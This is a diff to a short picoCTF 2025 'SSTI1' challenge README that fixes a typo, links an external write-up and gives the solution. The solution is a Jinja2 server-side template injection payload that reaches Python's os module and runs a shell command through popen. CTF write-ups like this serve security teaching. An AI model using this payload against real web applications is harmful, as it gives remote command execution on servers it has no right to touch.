@@ -1,6 +1,6 @@
 - Author: Venax
 
-toDescription
+Description
 
 I made a cool website where you can announce whatever you want! Try it out!
 Additional details will be available after launching your challenge instance.
@@ -9,8 +9,7 @@ I heard templating is a cool and modular way to build web apps! Check out my web
 
 _________________________________________________________________________________________
 
-Follow here
-https://mosec0.medium.com/picoctf-2025-ssti1-ctf-writeup-a5bf0d4977b5
+Follow here https://mosec0.medium.com/picoctf-2025-ssti1-ctf-writeup-a5bf0d4977b5
 
 Solution:
 {{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
